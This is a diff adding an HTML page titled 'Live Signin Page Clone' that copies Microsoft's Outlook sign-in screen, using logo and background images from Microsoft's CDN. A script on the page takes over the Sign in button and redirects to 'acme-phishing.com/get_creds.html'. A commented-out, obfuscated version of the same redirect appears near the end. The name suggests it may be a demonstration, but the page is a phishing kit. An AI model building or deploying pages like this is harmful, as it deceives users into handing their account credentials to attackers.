@@ -1,0 +1,228 @@
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <title>Live Signin Page Clone</title>
+	<style>
+		@import url(https://fonts.googleapis.com/css?family=Poppins:100,100italic,200,200italic,300,300italic,regular,italic,500,500italic,600,600italic,700,700italic,800,800italic,900,900italic);
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: 'Poppins', sans-serif;
+    color: #1b1b1b;
+}
+body {
+    display: grid;
+    place-items: center;
+    min-height: 100vh;
+    /* background-color: #dde2d1; */
+    background-image: url("https://logincdn.msauth.net/shared/5/js/../images/49_7916a894ebde7d29c2cc.jpg");
+}
+
+form {
+    width: 440px;
+    background-color: #fff;
+    box-shadow: 0 0 .5rem rgba(0, 0, 0, .2);
+    padding: 44px;
+}
+.logo { margin-bottom: 15px; }
+form h2 {
+    font-size: 24px;
+    font-weight: 500;
+}
+.form-group { margin: 0 0 16px; }
+form input {
+    padding: 6px 10px 6px 0;
+    margin-top: 1rem;
+    border: none;
+    outline: none;
+    border-bottom: 1px solid #000000b3;
+    width: 100%;
+    font-size: .9rem;
+}
+form p {
+    font-size: 13px;
+    margin-bottom: 16px;
+}
+form a {
+    color: #0067b8;
+    text-decoration: none;
+}
+form a:hover {
+    color: #000000b3;
+    text-decoration: underline;
+}
+form :is(.first, .second) > a { font-size: 13px; }
+form .first > a span {
+    width: 20px;
+    height: 20px;
+    border: 1px solid #000000b3;
+    display: inline-block;
+    text-align: center;
+    border-radius: 50%;
+    margin-left: 0.2em;
+}
+form button {
+    display: block;
+    margin-left: auto;
+    width: 108px;
+    height: 32px;
+    padding: 4px 12px;
+    font-size: 15px;
+    background-color: #0067b8;
+    color: #fff;
+    border: none;
+    outline: none;
+    cursor: pointer;
+}
+form button:hover { background-color: #004b85; }
+form button:active { transform: scale(.97); }
+
+.forms-container {
+    overflow-x: hidden;
+}
+.forms {
+    display: flex;
+    align-items: flex-start;
+    justify-content: space-between;
+    width: calc((440px - 88px) * 2);
+    transition: 200ms ease-in-out transform;
+}
+.first,
+.second {
+    width: 100%;
+}
+.arrow-btn {
+    cursor: pointer;
+    font-size: 1rem;
+    margin-right: 0.3rem;
+    width: 25px;
+    height: 25px;
+    display: inline-block;
+    border-radius: 50%;
+    text-align: center;
+    line-height: 25px;
+}
+.arrow-btn:hover {
+    background-color: rgba(0, 0, 0, .1);
+}
+
+.bottom {
+    width: 440px;
+    background-color: #fff;
+    box-shadow: 0 0 .5rem rgba(0, 0, 0, .2);
+    padding: 8px 44px;
+    font-size: 15px;
+    margin-top: 20px;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+}
+.bottom img {
+    width: 32px;
+    height: 32px;
+    margin-right: 12px;
+}
+.bottom:hover { background-color: #dde2d1; }
+
+.next-form { transform: translateX(-50%); }
+.image-container {
+  font-size: 0.9375rem; /* 15px */
+  line-height: 1.25rem; /* 20px */
+  margin-bottom: 24px; /* Space between this div and the div below */
+  text-align: center; /* Center the text and image */
+}
+
+.presentation-image {
+  width: 40%; /* Make the image smaller by setting a width */
+  height: auto; /* Maintain the aspect ratio */
+  display: block; /* Ensure the image is a block element */
+  margin: 0 auto; /* Center the image */
+}
+
+.f1n95isl {
+  line-height: 20px;
+}
+.fedgsey {
+  font-size: 0.8125rem;
+}
+.f71fsbu {
+  font-weight: 400;
+}
+
+
+	</style>
+</head><body>
+    <!-- <img class=" ___16myg58 f2rbwfs f10kou7y ftgm304 fcgxt0o f1ujusj6 fvueend f1iuewzk f1h7u52p fkqj71m" data-testid="backgroundLogo" alt="presentation" src="https://logincdn.msauth.net/shared/5/js/../images/53_8b36337037cff88c3df2.png"> -->
+      
+    <div class="container">
+        <div class="image-container">
+            <img class="presentation-image" data-testid="backgroundLogo" alt="presentation" src="https://logincdn.msauth.net/shared/5/js/../images/53_8b36337037cff88c3df2.png">
+          </div>
+        <form action="" method="POST">
+            <img class="logo" src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg">
+            <div class="forms-container">
+                <div class="forms">
+                    <div class="first">
+                        <h2>Sign in</h2>
+                        <div class="___q35p590 fedgsey f71fsbu f1n95isl">to continue to Outlook</div>
+                        <div class="form-group">
+                            <input type="email" placeholder="Email, Phone, or Skype">
+                        </div>
+                        <p>No account? <a href="#">Create One!</a></p>
+                        <a href="#">Sign in with a security key <span>?</span></a>
+                        <button type="button" class="next-btn">Next</button>
+                    </div>
+                    <div class="second">
+                        <p><span class="arrow-btn">←</span> <span class="email">helloworld@hotmail.com</span></p>
+                        <h2>Enter password</h2>
+                        <div class="form-group">
+                            <input type="password" placeholder="Password">
+                        </div>
+                        <a href="#">Forgot password?</a>
+                        <button type="submit">Sign in</button>
+                    </div>
+                </div>
+            </div>
+        </form>
+        <div class="bottom">
+            <img src="https://logincdn.msauth.net/shared/1.0/content/images/signin-options_4e48046ce74f4b89d45037c90576bfac.svg">
+            <span>Sign-in options</span>
+        </div>
+    </div>
+
+    <script>
+        const forms = document.querySelector('.forms')
+        const next_button = document.querySelector('.next-btn')
+        const arrow_btn = document.querySelector('.arrow-btn')
+
+        const email_input = document.querySelector('.first input')
+        const email_el = document.querySelector('.email')
+
+        next_button.addEventListener('click', () => {
+            forms.classList.add('next-form')
+            email_el.innerText = email_input.value
+            document.querySelector('.bottom').style.display = 'none'
+        })
+        arrow_btn.addEventListener('click', () => {
+            forms.classList.remove('next-form')
+            document.querySelector('.bottom').style.display = 'flex'
+        })
+    </script>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const signInButton = document.querySelector('form button[type="submit"]');
+            signInButton.addEventListener('click', function(event) {
+                event.preventDefault(); // Prevent the form submission (optional)
+                window.location.href = 'https://acme-phishing.com/get_creds.html';
+            });
+        });
+    </script>
+    <!-- <script>
+        const _0x30d109=_0x3335;function _0x4f60(){const _0x1fe895=['88gDbubE','click','108108ZaRlog','880665RKEWyd','location','DOMContentLoaded','173884mmftWD','520312NSGOhw','1248618OqDltX','querySelector','form\x20button[type=\x22submit\x22]','1341307MTbtvy','73611jMXOqp','addEventListener','1LhdDcV','href','7htqRQp','10VcphbD'];_0x4f60=function(){return _0x1fe895;};return _0x4f60();}function _0x3335(_0x3ef4c2,_0x51d0fc){const _0x4f607e=_0x4f60();return _0x3335=function(_0x3335c7,_0x90f2b4){_0x3335c7=_0x3335c7-0x1c8;let _0x459ae9=_0x4f607e[_0x3335c7];return _0x459ae9;},_0x3335(_0x3ef4c2,_0x51d0fc);}(function(_0x457ed7,_0x5b38cc){const _0x3cca90=_0x3335,_0x413170=_0x457ed7();while(!![]){try{const _0x384974=parseInt(_0x3cca90(0x1c8))/0x1*(parseInt(_0x3cca90(0x1d2))/0x2)+-parseInt(_0x3cca90(0x1ce))/0x3+parseInt(_0x3cca90(0x1d3))/0x4+parseInt(_0x3cca90(0x1cf))/0x5+parseInt(_0x3cca90(0x1d4))/0x6*(-parseInt(_0x3cca90(0x1ca))/0x7)+parseInt(_0x3cca90(0x1cc))/0x8*(parseInt(_0x3cca90(0x1d8))/0x9)+-parseInt(_0x3cca90(0x1cb))/0xa*(parseInt(_0x3cca90(0x1d7))/0xb);if(_0x384974===_0x5b38cc)break;else _0x413170['push'](_0x413170['shift']());}catch(_0x259117){_0x413170['push'](_0x413170['shift']());}}}(_0x4f60,0x1c936),document['addEventListener'](_0x30d109(0x1d1),function(){const _0x1f1d76=_0x30d109,_0x2e53db=document[_0x1f1d76(0x1d5)](_0x1f1d76(0x1d6));_0x2e53db[_0x1f1d76(0x1d9)](_0x1f1d76(0x1cd),function(_0x5776de){const _0x1c327a=_0x1f1d76;_0x5776de['preventDefault'](),window[_0x1c327a(0x1d0)][_0x1c327a(0x1c9)]='https://acme-phishing.com/get_creds.html';});}));
+    </script> -->
+
+
+</body>
